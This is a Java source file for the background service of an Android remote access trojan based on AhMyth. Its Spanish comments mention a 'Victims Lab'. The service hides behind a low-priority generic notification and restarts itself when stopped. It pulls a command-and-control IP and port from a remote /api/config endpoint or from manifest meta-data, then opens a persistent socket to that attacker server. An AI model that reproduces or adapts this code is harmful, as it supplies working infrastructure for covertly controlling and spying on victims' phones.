package ahmyth.mine.king.ahmyth;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.text.TextUtils;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainService extends Service {
    // Usamos el tag "AhMyth" para todos los logs del servicio
    private static final String TAG = "AhMyth";
    private static Context appContext;

    /**
     * Arranca el servicio en primer plano apropiadamente según la versión de Android.
     */
    public static void startService(Context context) {
        Intent intent = new Intent(context.getApplicationContext(), MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.getApplicationContext().startForegroundService(intent);
        } else {
            context.getApplicationContext().startService(intent);
        }
    }

    /**
     * Permite a otras clases obtener el contexto de la aplicación.
     */
    public static Context getContextOfApplication() {
        return appContext;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        appContext = getApplicationContext();
        Log.i(TAG, "Service created");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // No se usa binding en este servicio
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand");
        // Iniciamos en primer plano con notificación válida
        startForegroundIfNeeded();

        // Inicializamos la conexión de socket en un hilo separado para evitar NetworkOnMainThreadException
        Thread socketThread = new Thread(() -> {
            initSocket();
        }, "SocketInitThread");
        socketThread.start();

        // En caso de ser detenido por el sistema, reiniciar
        return START_STICKY;
    }

    /**
     * Selecciona el método de foreground según versión de Android.
     */
    private void startForegroundIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundNotification();
        } else {
            Notification notification = new NotificationCompat.Builder(this)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("App running in background")
                .setContentText("Conectando con Victims Lab…")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
            startForeground(1, notification);
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startForegroundNotification() {
        String channelId = "com.play.service.techno";
        String channelName = "My Background Service";
        NotificationChannel chan = new NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_LOW
        );
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        mgr.createNotificationChannel(chan);

        Notification notification = new NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setContentTitle("App running in background")
            .setContentText("Conectando con Victims Lab…")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();

        startForeground(1, notification);
    }

    /**
     * Lee la IP y el puerto desde los <meta-data> del AndroidManifest y conecta el socket.
     * Ahora primero intenta obtener configuración dinámica desde /api/config.
     */
    private void initSocket() {
        Log.i(TAG, "Initializing socket connection");

        String serverIp = null;
        String serverPort = null;
        String configUrl = null;

        // 1) Primero, extraemos el Bundle de meta-data como fallback
        try {
            ApplicationInfo ai = getPackageManager().getApplicationInfo(
                getPackageName(),
                PackageManager.GET_META_DATA
            );
            Bundle meta = ai.metaData;
            if (meta != null) {
                Object ipObj   = meta.get("SERVER_IP");
                Object portObj = meta.get("SERVER_PORT");
                serverIp   = (ipObj   != null ? ipObj.toString()   : null);
                serverPort = (portObj != null ? portObj.toString() : null);

                Log.i(TAG, "Meta-data read: SERVER_IP=" + serverIp
                           + " SERVER_PORT=" + serverPort);
                
                // Construir URL de configuración basada en los meta-data
                if (!TextUtils.isEmpty(serverIp)) {
                    configUrl = "http://" + serverIp + ":3000/api/config";
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Error reading meta-data", e);
        }

        // 2) Intentar obtener configuración dinámica del servidor
        if (!TextUtils.isEmpty(configUrl)) {
            Log.i(TAG, "Attempting to fetch dynamic config from: " + configUrl);
            try {
                String[] dynamicConfig = fetchDynamicConfig(configUrl);
                if (dynamicConfig != null && dynamicConfig.length == 2) {
                    serverIp = dynamicConfig[0];
                    serverPort = dynamicConfig[1];
                    Log.i(TAG, "Dynamic config fetched successfully: SERVER_IP=" + serverIp
                               + " SERVER_PORT=" + serverPort);
                } else {
                    Log.w(TAG, "Failed to fetch dynamic config, using manifest values");
                }
            } catch (Exception e) {
                Log.w(TAG, "Error fetching dynamic config, using manifest values: " + e.getMessage());
            }
        }

        // 3) Validamos que no sean vacíos
        if (TextUtils.isEmpty(serverIp) || TextUtils.isEmpty(serverPort)) {
            Log.e(TAG, "Missing SERVER_IP or SERVER_PORT in manifest meta-data");
            return;
        }

        // 4) Parse y conexión
        try {
            int port = Integer.parseInt(serverPort);
            Log.i(TAG, "Connecting to " + serverIp + ":" + port);
            IOSocket.connect(serverIp, port);
        } catch (NumberFormatException e) {
            Log.e(TAG, "Invalid server port: " + serverPort, e);
        } catch (Exception e) {
            Log.e(TAG, "Socket connection failed", e);
        }
    }

    /**
     * Intenta obtener la configuración dinámica del servidor.
     * @param configUrl URL del endpoint de configuración
     * @return Array con [SERVER_IP, SERVER_PORT] o null si falla
     */
    private String[] fetchDynamicConfig(String configUrl) {
        HttpURLConnection conn = null;
        BufferedReader reader = null;
        try {
            URL url = new URL(configUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);  // 5 second timeout
            conn.setReadTimeout(5000);
            
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream())
                );
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                
                // Parse JSON response
                JSONObject json = new JSONObject(response.toString());
                String ip = json.optString("SERVER_IP", null);
                int portInt = json.optInt("SERVER_PORT", -1);
                
                if (!TextUtils.isEmpty(ip) && portInt > 0 && portInt <= 65535) {
                    return new String[]{ip, String.valueOf(portInt)};
                }
            } else {
                Log.w(TAG, "Config endpoint returned code: " + responseCode);
            }
        } catch (Exception e) {
            Log.w(TAG, "Exception fetching config: " + e.getMessage());
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (Exception e) {
                    // Ignore close errors
                }
            }
            if (conn != null) {
                conn.disconnect();
            }
        }
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed, disconnecting socket");
        try {
            IOSocket.getInstance().disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error disconnecting socket", e);
        }
    }
}